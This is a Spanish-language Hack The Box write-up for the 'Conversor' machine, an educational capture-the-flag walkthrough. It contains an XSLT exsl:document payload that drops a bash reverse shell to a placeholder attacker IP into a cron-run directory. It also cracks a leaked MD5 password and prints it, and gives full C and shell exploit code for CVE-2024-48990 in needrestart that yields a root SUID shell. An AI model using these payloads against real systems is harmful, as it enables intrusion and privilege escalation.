---
title: "HTB Conversor - Write-Up"
date: 2026-11-23
categories: [Hack The Box]
tags: [xslt-injection, lxml, exslt, cron-abuse, md5-cracking, cve-2024-48990, needrestart-privesc]
---

Write-up de **Conversor**, máquina Linux de Hack The Box. El camino: varios callejones sin salida en una inyección XSLT (XXE, SSRF, RCE vía extensión Python no registrada), el vector real de RCE usando la extensión estándar EXSLT `exsl:document` para dejar caer un script en un directorio vigilado por cron, un hash MD5 filtrado en la base de datos SQLite, y escalada final a root abusando de **CVE-2024-48990** en `needrestart`.

## Fase 1 — Reconocimiento

```bash
nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -T4 10.129.238.31 -oG allPorts
nmap -sVC -p22,80 -oN targeted 10.129.238.31
```

- **22**: OpenSSH 8.9p1 Ubuntu.
- **80**: Apache 2.4.52 (Ubuntu), redirige al vhost `conversor.htb` (añadir a `/etc/hosts`).
- Sistema: Ubuntu 22.04 LTS.

Un `gobuster`/`feroxbuster` contra el vhost descubre `/about`, `/login`, `/register`, `/convert` (405, solo acepta `POST`) y `/server-status` (403). La web es una página de login con `/register` abierto. Tras registrarse y entrar, el panel ofrece una funcionalidad de conversión: subir un `xml_file` y un `xslt_file` a `/convert`, que el backend los transforma con `lxml`/`libxslt` y sirve el resultado en `/view/<id>`.

## Fase 2 — Inyección XSLT: varios caminos descartados

Subir un XSLT propio permite controlar la transformación — candidato claro a **Server-Side XSLT Injection**. Se exploran tres vías clásicas contra `lxml`/`libxslt`, las tres bloqueadas:

> **Descartado — XXE / LFI vía `document()`:**
> ```xml
> <xsl:value-of select="document('file:///etc/passwd')"/>
> ```
> Falla con `Cannot resolve URI`. No es un bloqueo de permisos: `libxslt` solo resuelve `document()` sobre contenido que pueda reparsear como XML, y `/etc/passwd` no lo es. Confirmado también que el parser de la app inicializa `lxml` con `resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False`, lo que además bloquea XXE y SSRF de forma explícita.

> **Descartado — RCE vía extensión `py:eval`:**
> ```xml
> <xsl:value-of select="py:eval('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()')"/>
> ```
> Tras corregir varios problemas de escapado de comillas, el resultado sigue siendo `XPath evaluation returned no result`. Al descargar el código fuente de la app (ver Fase 3) se confirma por qué: **no hay ningún `etree.FunctionNamespace` registrado** en `app.py`, así que `py:eval` no existe como función — el XSLT simplemente la trata como una extensión desconocida y devuelve vacío.

El fichero `nmap.xslt` que el propio sitio ofrece como plantilla de ejemplo (en `/static/nmap.xslt`) sirve para entender el formato esperado por el conversor, pero no aporta una vía de explotación por sí solo.

## Fase 3 — Descarga del código fuente

El `/about` enlaza a un `source_code.tar.gz` descargable. Al extraerlo:

```bash
file source_code.tar.gz
# POSIX tar archive (GNU)   <-- no es gzip real pese a la extensión
tar -xvf source_code.tar.gz   # sin la flag -z
```

Puntos clave de `app.py`:

- `app.secret_key = 'Changemeplease'` hardcodeada.
- `xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)` sin ningún `secure_filename()` — **Path Traversal en el nombre de fichero** al subir (confirmable escribiendo un `filename` con ruta absoluta, ya que `os.path.join('/a', '/b/c')` devuelve `/b/c`).
- El parser `lxml` se inicializa con `resolve_entities=False, no_network=True, load_dtd=False` — bloquea XXE/SSRF de forma explícita.
- `install.md` describe un cron que corre cada minuto como `www-data`:

```
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```

> **Descartado — secreto de sesión Flask hardcodeado:** firmar una cookie con `flask-unsign --sign --cookie "{'user_id': 1}" --secret 'Changemeplease'` falla contra el servidor real (redirige a `/login`): el secreto en producción es distinto del valor de la plantilla filtrada.

## Fase 4 — RCE real: `exsl:document` + cron sobre `scripts/`

El intento inicial de usar el Path Traversal de la subida para sobrescribir ficheros de la app (plantillas Jinja2, `app.wsgi`) resulta innecesariamente arriesgado y no hace falta: `libxslt` soporta de forma nativa la extensión estándar **EXSLT** `exsl:document`, que permite escribir el resultado de la transformación directamente en una ruta del sistema de archivos — sin necesidad de ningún `py:eval` ni extensión Python registrada.

Combinando eso con el cron ya detectado (ejecuta cualquier `.py` dentro de `scripts/` cada minuto como `www-data`), basta con escribir el payload ahí dentro:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
  <xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/scripts/pwn.py" method="text">
      <xsl:text>
import os
os.system("/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/IP_ATACANTE/443 0&gt;&amp;1'")
      </xsl:text>
    </exsl:document>
  </xsl:template>
</xsl:stylesheet>
```

(Los caracteres `>` y `&` del payload bash van escapados como entidades XML — `&gt;` y `&amp;` — para que el XSLT siga siendo XML válido.)

```bash
nc -lvnp 443
curl -i -b "session=TU_COOKIE" \
  -F 'xml_file=@test.xml;type=application/xml' \
  -F 'xslt_file=@evil.xslt;type=application/xslt+xml' \
  http://conversor.htb/convert
```

En menos de un minuto, el cron recoge `pwn.py` y lo ejecuta:

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Fase 5 — De `www-data` a `fismathack`: hash MD5 en SQLite

Enumerando el sistema aparece el usuario `fismathack` (home con permisos `750`, inaccesible directamente). Dentro del directorio de la app:

```bash
sqlite3 /var/www/conversor.htb/instance/users.db "select * from users;"
```

```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|test|cc03e747a6afbbcbf8be7668acfebee5
```

Hash MD5 clásico de 32 caracteres:

```bash
echo "5b5c3ac3a1c897c94caad48e6c71fdec" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
Keepmesafeandwarm
```

> **Nota:** el mismo cron que dio el RCE (`scripts/*.py` cada minuto) corre como `www-data`, el mismo usuario que ya se tiene, así que no sirve para escalar más allá — hay que buscar la credencial en otro sitio.

```bash
ssh fismathack@10.129.238.31
# password: Keepmesafeandwarm
```

### Flag de usuario

```bash
cat ~/user.txt
```

## Fase 6 — CVE-2024-48990: escalada a root vía `needrestart`

```bash
sudo -l
```

```
User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

La versión instalada, `needrestart 3.5`, es vulnerable a **CVE-2024-48990**: al ejecutarse como root, escanea los procesos Python en marcha y hereda su `PYTHONPATH`. Si ese `PYTHONPATH` apunta a un directorio controlado por el atacante que contiene un módulo `importlib/__init__.so` (no un `.py` — tiene que ser una librería compilada, el primer intento con un `.py` falla sin error claro), `needrestart` termina cargando ese `.so` malicioso con privilegios de root.

Requisitos para disparar la carga: un proceso Python "señuelo" vivo en el momento del escaneo, importando activamente `importlib` en bucle (un simple `time.sleep()` no es suficiente, porque `needrestart` necesita ver la importación real para decidir recargar ese proceso).

```c
// lib.c — al cargarse, da una shell SUID
__attribute__((constructor))
void init() {
    if (getuid() == 0) {
        system("cp /bin/sh /tmp/poc; chmod 4755 /tmp/poc");
    }
}
```

```bash
mkdir -p /tmp/malicious/importlib
gcc -shared -fPIC -o /tmp/malicious/importlib/__init__.so lib.c

cat > /tmp/malicious/e.py << 'EOF'
import importlib, time, os
while not os.path.exists("/tmp/poc"):
    importlib.import_module("importlib")
    time.sleep(1)
EOF

cd /tmp/malicious
export PYTHONPATH="$PWD"
python3 e.py &
```

En otra sesión, se dispara el escaneo que carga el `.so` como root:

```bash
sudo /usr/sbin/needrestart
```

```bash
ls -la /tmp/poc
# -rwsr-xr-x 1 root root 125688 nov 23 21:42 /tmp/poc

/tmp/poc -p
whoami
# root (euid=0; el bit SUID solo eleva el UID efectivo, no el real)
```

### Flag de root

```bash
cat /root/root.txt
```

## Conclusión

Conversor combina un punto de entrada web poco convencional (inyección XSLT) con varios callejones sin salida — `document()` capado, sin extensiones Python registradas, secreto de Flask no explotable, Path Traversal en la subida que no hace falta usar — y la vía real: una extensión EXSLT estándar (`exsl:document`) que escribe en disco sin necesidad de ningún RCE de Python, combinada con un cron ya expuesto en el código fuente. De ahí, credenciales filtradas en una base de datos SQLite local → una CVE reciente de Linux (`needrestart`) para rematar con root.
